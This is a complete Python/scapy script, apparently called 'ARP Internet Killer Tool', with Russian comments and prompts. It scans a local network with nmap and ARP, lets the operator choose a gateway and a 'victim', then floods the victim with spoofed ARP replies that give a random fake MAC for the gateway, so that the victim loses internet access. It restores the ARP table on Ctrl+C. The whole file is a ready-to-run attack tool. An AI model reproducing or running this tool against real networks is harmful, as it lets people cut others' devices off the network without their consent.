#!/usr/bin/env python3
import os
import sys
import time
import random
import threading
import subprocess
import ipaddress
from scapy.all import ARP, send, srp, Ether, conf, sr1
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

conf.verb = 0

def run_fzf(options, prompt):
    """Запуск fzf для выбора"""
    try:
        result = subprocess.run(
            ['fzf', '--reverse', '--height=40%', '--prompt', prompt],
            input='\n'.join(options),
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            return result.stdout.strip()
    except:
        return simple_select(options, prompt)
    return None

def simple_select(options, prompt):
    """Простой выбор если fzf не доступен"""
    print(f"\n{prompt}:")
    for i, option in enumerate(options, 1):
        print(f"  {i}. {option}")
    try:
        choice = int(input("Выберите номер: ")) - 1
        return options[choice]
    except:
        return None

def get_interfaces():
    """Получение сетевых интерфейсов"""
    interfaces = []
    try:
        output = subprocess.check_output(
            "ip -o link show | awk -F': ' '{print $2}' | grep -E '^(en|eth|wlan|wl|usb)' | sort",
            shell=True, text=True
        ).strip().split('\n')
        interfaces = [iface for iface in output if iface]
    except:
        interfaces = ["eth0", "wlan0"]
    return interfaces

def get_network_info(interface):
    """Получение информации о сети"""
    try:
        # Получаем MAC
        with open(f"/sys/class/net/{interface}/address", "r") as f:
            mac = f.read().strip()
        
        # Получаем IP и маску
        result = subprocess.run(
            f"ip -4 addr show {interface} | grep inet",
            shell=True, capture_output=True, text=True
        )
        if result.stdout:
            ip_info = result.stdout.strip().split()[1]
            ip = ip_info.split('/')[0]
            mask = int(ip_info.split('/')[1])
            return ip, mac, mask
    except:
        pass
    return None, None, None

def get_gateway_info():
    """Автоматическое получение шлюза"""
    try:
        # Получаем IP шлюза
        result = subprocess.run(
            "ip route | grep default | head -1",
            shell=True, capture_output=True, text=True
        )
        if result.stdout:
            gateway_ip = result.stdout.strip().split()[2]
            
            # Получаем MAC шлюза из ARP таблицы
            result = subprocess.run(
                f"ip neigh | grep '{gateway_ip} ' | awk '{{print $5}}'",
                shell=True, capture_output=True, text=True
            )
            gateway_mac = result.stdout.strip()
            
            # Если нет в ARP таблице, делаем ARP запрос
            if not gateway_mac:
                print(f"  \033[1;33m[*] Запрашиваю MAC шлюза {gateway_ip}...\033[0m")
                arp_req = ARP(pdst=gateway_ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = broadcast / arp_req
                answered, _ = srp(packet, timeout=2, verbose=False, retry=3)
                if answered:
                    gateway_mac = answered[0][1].hwsrc
            
            if gateway_mac:
                return gateway_ip, gateway_mac
    except:
        pass
    return None, None

def aggressive_arp_ping(ip, timeout=0.5, retry=3):
    """Агрессивный ARP пинг с несколькими попытками"""
    for attempt in range(retry):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            
            # Используем sr1 с более агрессивными параметрами
            response = sr1(packet, timeout=timeout, verbose=False, retry=1)
            
            if response:
                return {
                    'ip': response.psrc,
                    'mac': response.hwsrc
                }
        except:
            pass
    return None

def find_local_network_devices(local_ip, mask):
    """Поиск устройств в локальной сети разными методами"""
    devices = []
    found_ips = set()
    
    # Определяем сеть
    try:
        network = ipaddress.IPv4Network(f"{local_ip}/{mask}", strict=False)
        network_prefix = str(network.network_address).rsplit('.', 1)[0]
    except:
        ip_parts = local_ip.split('.')
        network_prefix = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
    
    print(f"\n\033[1;36m🔍 Агрессивное сканирование сети {network_prefix}.0/{mask}\033[0m")
    print("\033[1;33mℹ  Использую комбинированные методы сканирования...\033[0m")
    
    print(f"\033[1;33m Сканирование с помощью nmap (если доступен)...\033[0m")
    
    # Метод 2: Используем nmap если есть (самый надежный метод)
    try:
        # Проверяем, установлен ли nmap
        subprocess.run(["which", "nmap"], capture_output=True, check=True)
        
        print("  \033[1;33m[*] Запускаю nmap...\033[0m")
        
        # Быстрое сканирование с nmap
        result = subprocess.run(
            f"nmap -sn -n --min-parallelism 100 --max-rtt-timeout 2000ms {network_prefix}.0/24",
            shell=True, capture_output=True, text=True, timeout=60
        )
        
        if result.returncode == 0:
            # Парсим вывод nmap
            lines = result.stdout.split('\n')
            current_ip = None
            
            for line in lines:
                if 'Nmap scan report for' in line:
                    parts = line.split()
                    current_ip = parts[4]
                elif 'MAC Address:' in line and current_ip:
                    parts = line.split()
                    mac = parts[2]
                    
                    if current_ip not in found_ips and current_ip != local_ip:
                        devices.append({'ip': current_ip, 'mac': mac})
                        found_ips.add(current_ip)
                        current_ip = None
    except:
        print("  \033[1;33m[!] nmap не найден или произошла ошибка\033[0m")
    
    # Сортируем устройства по IP
    devices.sort(key=lambda x: [int(octet) for octet in x['ip'].split('.')])
    
    return devices

def show_banner():
    """Показ баннера"""
    os.system('clear')
    print("""
    \033[1;31m
╔══════════════════════════════════════════════════════════╗
║              🔥 ARP Internet Killer Tool 🔥             ║
║         Максимально агрессивное сканирование сети        ║
╚══════════════════════════════════════════════════════════╝\033[0m
    """)

def main():
    # Проверка прав
    if os.geteuid() != 0:
        print("\033[1;31m[!] Требуются права root! Запустите:\033[0m")
        print("\033[1;33m    sudo python3 arp_kill.py\033[0m")
        sys.exit(1)
    
    show_banner()
    
    # Выбор интерфейса
    interfaces = get_interfaces()
    if not interfaces:
        print("\033[1;31m[!] Не найдены сетевые интерфейсы\033[0m")
        sys.exit(1)
    
    interface = run_fzf(interfaces, "📡 Выберите интерфейс →")
    if not interface:
        print("\033[1;33m[!] Интерфейс не выбран\033[0m")
        sys.exit(1)
    
    # Получаем сетевую информацию
    local_ip, local_mac, network_mask = get_network_info(interface)
    if not local_ip:
        print(f"\033[1;31m[!] Не удалось получить информацию для {interface}\033[0m")
        sys.exit(1)
    
    # Автоматически определяем шлюз
    print(f"\n\033[1;33m[*] Автоматически определяю шлюз...\033[0m")
    gateway_ip, gateway_mac = get_gateway_info()
    
    print(f"\n\033[1;32m[✓] Интерфейс:\033[0m \033[1;36m{interface}\033[0m")
    print(f"\033[1;32m[✓] Ваш IP:\033[0m \033[1;36m{local_ip}\033[0m")
    print(f"\033[1;32m[✓] Ваш MAC:\033[0m \033[1;36m{local_mac}\033[0m")
    print(f"\033[1;32m[✓] Маска сети:\033[0m \033[1;36m/{network_mask}\033[0m")
    
    if gateway_ip:
        print(f"\033[1;32m[✓] Найден шлюз:\033[0m \033[1;36m{gateway_ip}\033[0m")
        if gateway_mac:
            print(f"\033[1;32m[✓] MAC шлюза:\033[0m \033[1;36m{gateway_mac}\033[0m")
    else:
        print(f"\033[1;33m[!] Шлюз не найден автоматически\033[0m")
    
    # Выбор режима - СКАНИРОВАНИЕ НА ПЕРВОМ МЕСТЕ
    mode_options = []
    mode_options.append("🔍 Агрессивное сканирование сети")
    mode_options.append("📝 Ввести данные вручную")
    
    mode = run_fzf(mode_options, "🎯 Выберите режим →")
    if not mode:
        sys.exit(1)
    
    if "Использовать шлюз" in mode:
        # Используем автоматически найденный шлюз
        print(f"\n\033[1;32m[✓] Использую автоматически найденный шлюз: {gateway_ip}\033[0m")
        
        # Ввод жертвы
        print("\n\033[1;34m[?] Введите IP жертвы:\033[0m")
        victim_ip = input("   IP жертвы: ").strip()
        
        # Определяем MAC жертвы
        print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
        
        # Агрессивный поиск MAC
        victim_mac = None
        for attempt in range(3):
            arp_req = ARP(pdst=victim_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_req
            answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
            
            if answered:
                victim_mac = answered[0][1].hwsrc
                print(f"\033[1;32m[✓] MAC жертвы: {victim_mac}\033[0m")
                break
            else:
                print(f"  \033[1;33m[!] Попытка {attempt+1}/3 не удалась\033[0m")
        
        if not victim_mac:
            print(f"\033[1;31m[!] Не удалось найти MAC жертвы {victim_ip}\033[0m")
            victim_mac = input(f"\033[1;34m[?] Введите MAC жертвы {victim_ip}: \033[0m").strip()
    
    elif "сканирование" in mode.lower():
        # Цикл выбора с опцией повторного сканирования
        while True:
            # Агрессивное сканирование сети
            devices = find_local_network_devices(local_ip, network_mask)
            
            # Выводим найденные устройства
            print(f"\n\033[1;32m{'═'*60}\033[0m")
            if devices:
                print(f"\033[1;42m НАЙДЕНО УСТРОЙСТВ: {len(devices)} ".center(60) + "\033[0m")
            else:
                print(f"\033[1;41m УСТРОЙСТВА НЕ НАЙДЕНЫ ".center(60) + "\033[0m")
            print(f"\033[1;32m{'═'*60}\033[0m")
            
            for i, device in enumerate(devices, 1):
                print(f"\033[1;36m{i:3d}. IP: {device['ip']:15s} | MAC: {device['mac']}\033[0m")
            
            # Создаем список опций
            options_list = []
            
            # Опция выбора шлюза (только если еще не выбран)
            if not gateway_ip or not gateway_mac:
                if devices:
                    options_list.append("🌐 Выбрать шлюз из списка")
                else:
                    options_list.append("🌐 Ввести шлюз вручную")
            
            # Опции для жертвы
            if devices:
                victims_list = []
                for d in devices:
                    # Исключаем свой IP и уже выбранный шлюз (если есть)
                    if d['ip'] != local_ip and (not gateway_ip or d['ip'] != gateway_ip):
                        victims_list.append(f"{d['ip']:15s} | {d['mac']}")
                
                if victims_list:
                    options_list.append("🎯 Выбрать жертву из списка")
                else:
                    options_list.append("🎯 Ввести жертву вручную")
            else:
                options_list.append("🎯 Ввести жертву вручную")
            
            # Общие опции
            options_list.append("🔄 Повторить сканирование сети")
            options_list.append("❌ Выйти в главное меню")
            
            # Выбор действия
            action = run_fzf(options_list, "📋 Выберите действие →")
            if not action:
                sys.exit(1)
            
            if "Выбрать шлюз" in action:
                # Выбираем шлюз из списка
                device_list = [f"{d['ip']:15s} | {d['mac']}" for d in devices]
                gateway_choice = run_fzf(device_list, "🌐 Выберите шлюз (роутер) →")
                if gateway_choice:
                    gateway_ip = gateway_choice.split('|')[0].strip()
                    for d in devices:
                        if d['ip'] == gateway_ip:
                            gateway_mac = d['mac']
                            print(f"\033[1;32m[✓] Шлюз выбран: {gateway_ip} ({gateway_mac})\033[0m")
                            break
            
            elif "Ввести шлюз вручную" in action:
                # Ввод шлюза вручную
                gateway_ip = input("\n\033[1;34m[?] Введите IP шлюза: \033[0m").strip()
                # Определяем MAC шлюза
                print(f"\n\033[1;33m[*] Определяю MAC шлюза {gateway_ip}...\033[0m")
                for attempt in range(3):
                    arp_req = ARP(pdst=gateway_ip)
                    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = broadcast / arp_req
                    answered, _ = srp(packet, timeout=3, verbose=False, retry=2)
                    if answered:
                        gateway_mac = answered[0][1].hwsrc
                        print(f"\033[1;32m[✓] MAC шлюза: {gateway_mac}\033[0m")
                        break
                else:
                    gateway_mac = input(f"\033[1;34m[?] Введите MAC шлюза {gateway_ip}: \033[0m").strip()
            
            elif "Выбрать жертву" in action:
                # Выбираем жертву из списка
                victims_list = []
                for d in devices:
                    if d['ip'] != local_ip and (not gateway_ip or d['ip'] != gateway_ip):
                        victims_list.append(f"{d['ip']:15s} | {d['mac']}")
                
                victim_choice = run_fzf(victims_list, "🎯 Выберите жертву →")
                if victim_choice:
                    victim_ip = victim_choice.split('|')[0].strip()
                    for d in devices:
                        if d['ip'] == victim_ip:
                            victim_mac = d['mac']
                            print(f"\033[1;32m[✓] Жертва выбрана: {victim_ip} ({victim_mac})\033[0m")
                            break
                    # Проверяем, есть ли все данные для атаки
                    if gateway_ip and gateway_mac and victim_ip and victim_mac:
                        break  # Выходим из цикла для начала атаки
                    else:
                        print("\033[1;33m[!] Недостаточно данных для атаки. Укажите шлюз.\033[0m")
            
            elif "Ввести жертву вручную" in action:
                # Ввод жертвы вручную
                victim_ip = input("\n\033[1;34m[?] Введите IP жертвы: \033[0m").strip()
                # Определяем MAC жертвы
                print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
                for attempt in range(3):
                    arp_req = ARP(pdst=victim_ip)
                    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = broadcast / arp_req
                    answered, _ = srp(packet, timeout=3, verbose=False, retry=2)
                    if answered:
                        victim_mac = answered[0][1].hwsrc
                        print(f"\033[1;32m[✓] MAC жертвы: {victim_mac}\033[0m")
                        break
                else:
                    victim_mac = input(f"\033[1;34m[?] Введите MAC жертвы {victim_ip}: \033[0m").strip()
                
                # Проверяем, есть ли все данные для атаки
                if gateway_ip and gateway_mac and victim_ip and victim_mac:
                    break  # Выходим из цикла для начала атаки
                else:
                    print("\033[1;33m[!] Недостаточно данных для атаки. Укажите шлюз.\033[0m")
            
            elif "Повторить сканирование" in action:
                # Просто продолжаем цикл (начнется с нового сканирования)
                continue
            
            elif "Выйти в главное меню" in action:
                print("\033[1;33m[!] Возврат в главное меню\033[0m")
                main()  # Просто выходим, можно перезапустить скрипт
    
    else:  # Ручной режим
        print("\n\033[1;34m[?] Введите данные вручную:\033[0m")
        
        # Предлагаем использовать автоматически найденный шлюз
        if gateway_ip:
            use_auto = run_fzf([f"✅ Использовать автоматически найденный шлюз ({gateway_ip})", "📝 Ввести другой шлюз"], "🌐 Выберите шлюз →")
            if "автоматически" in use_auto:
                print(f"\033[1;32m[✓] Использую шлюз: {gateway_ip}\033[0m")
                if not gateway_mac:
                    print(f"\033[1;33m[*] Определяю MAC шлюза {gateway_ip}...\033[0m")
                    for attempt in range(3):
                        arp_req = ARP(pdst=gateway_ip)
                        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                        packet = broadcast / arp_req
                        answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
                        if answered:
                            gateway_mac = answered[0][1].hwsrc
                            print(f"\033[1;32m[✓] MAC шлюза: {gateway_mac}\033[0m")
                            break
                    else:
                        gateway_mac = input(f"\033[1;34m[?] Введите MAC шлюза {gateway_ip}: \033[0m").strip()
            else:
                gateway_ip = input("   IP шлюза (роутера): ").strip()
                gateway_mac = None
        else:
            gateway_ip = input("   IP шлюза (роутера): ").strip()
            gateway_mac = None
        
        victim_ip = input("   IP жертвы: ").strip()
        victim_mac = None
        
        # Определяем MAC адреса если они не известны
        if not gateway_mac:
            print(f"\n\033[1;33m[*] Определяю MAC шлюза {gateway_ip}...\033[0m")
            for attempt in range(3):
                arp_req = ARP(pdst=gateway_ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = broadcast / arp_req
                answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
                if answered:
                    gateway_mac = answered[0][1].hwsrc
                    print(f"\033[1;32m[✓] MAC шлюза: {gateway_mac}\033[0m")
                    break
            else:
                gateway_mac = input(f"\033[1;34m[?] Введите MAC шлюза {gateway_ip}: \033[0m").strip()
        
        print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
        for attempt in range(3):
            arp_req = ARP(pdst=victim_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_req
            answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
            if answered:
                victim_mac = answered[0][1].hwsrc
                print(f"\033[1;32m[✓] MAC жертвы: {victim_mac}\033[0m")
                break
        else:
            victim_mac = input(f"\033[1;34m[?] Введите MAC жертвы {victim_ip}: \033[0m").strip()
    
    # Проверяем что все данные есть
    if not gateway_ip or not gateway_mac or not victim_ip or not victim_mac:
        print("\033[1;31m[!] Не все данные заполнены. Выход.\033[0m")
        sys.exit(1)
    
    # Подтверждение
    print(f"""
\033[1;31m{'═'*60}\033[0m
\033[1;41m{' ВНИМАНИЕ: АТАКА НАЧНЕТСЯ '.center(60)}\033[0m
\033[1;31m{'═'*60}\033[0m

\033[1;33m🌐 Шлюз:\033[0m    \033[1;36m{gateway_ip}\033[0m (\033[1;35m{gateway_mac}\033[0m)
\033[1;33m🎯 Жертва:\033[0m  \033[1;36m{victim_ip}\033[0m (\033[1;35m{victim_mac}\033[0m)
\033[1;33m📡 Интерфейс:\033[0m \033[1;36m{interface}\033[0m

\033[1;31m⚠  Жертва \033[1;36m{victim_ip}\033[1;31m потеряет доступ к интернету!\033[0m
\033[1;32m✓  Нажмите \033[1;33mCtrl+C\033[1;32m для остановки и восстановления\033[0m
""")
    
    confirm = run_fzf(["✅ Да, начать атаку", "❌ Нет, отменить"], "🔥 Подтвердить запуск? →")
    if not confirm or "отменить" in confirm.lower():
        print("\033[1;33m[!] Атака отменена\033[0m")
        sys.exit(0)
    
    # Запуск атаки
    print(f"\n\033[1;31m[🔥] АТАКА ЗАПУЩЕНА! Не закрывайте окно...\033[0m")
    print(f"\033[1;33m[📡] Отправка ARP-пакетов через {interface}\033[0m")
    print(f"\033[1;32m[✋] Нажмите Ctrl+C для остановки\033[0m\n")
    
    packets_sent = 0
    start_time = time.time()
    
    try:
        while True:
            # Генерируем случайный ложный MAC
            fake_mac = f"00:{random.randint(16, 99):02d}:{random.randint(16, 99):02d}:" \
                      f"{random.randint(16, 99):02d}:{random.randint(16, 99):02d}:{random.randint(16, 99):02d}"
            
            # Отправляем жертве ложный ARP-ответ
            arp_packet = ARP(
                op=2,  # ARP reply
                pdst=victim_ip,
                hwdst=victim_mac,
                psrc=gateway_ip,
                hwsrc=fake_mac
            )
            
            send(arp_packet, verbose=False)
            packets_sent += 1
            
            # Обновление статуса
            elapsed = int(time.time() - start_time)
            status = f"\033[1;36m[📊] Пакетов: {packets_sent:6d} | Время: {elapsed:4d}с | Жертва: {victim_ip}\033[0m"
            sys.stdout.write(f"\r{status}")
            sys.stdout.flush()
            
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        # Восстановление
        print(f"\n\n\033[1;32m{'═'*60}\033[0m")
        print("\033[1;42m" + " ВОССТАНОВЛЕНИЕ ".center(60) + "\033[0m")
        print(f"\033[1;32m{'═'*60}\033[0m")
        
        print(f"\033[1;33m[*] Восстанавливаю ARP-таблицу жертвы {victim_ip}...\033[0m")
        
        for i in range(20):
            restore_packet = ARP(
                op=2,
                pdst=victim_ip,
                hwdst=victim_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac
            )
            send(restore_packet, verbose=False)
            time.sleep(0.1)
        
        elapsed = int(time.time() - start_time)
        print(f"\033[1;32m[✓] ARP-таблица восстановлена!\033[0m")
        print(f"\033[1;32m[✓] Всего отправлено пакетов: {packets_sent}\033[0m")
        print(f"\033[1;32m[✓] Общее время атаки: {elapsed} секунд\033[0m")
        print(f"\033[1;32m[✓] Жертва {victim_ip} снова видит шлюз {gateway_ip}\033[0m")

if __name__ == "__main__":
    main()
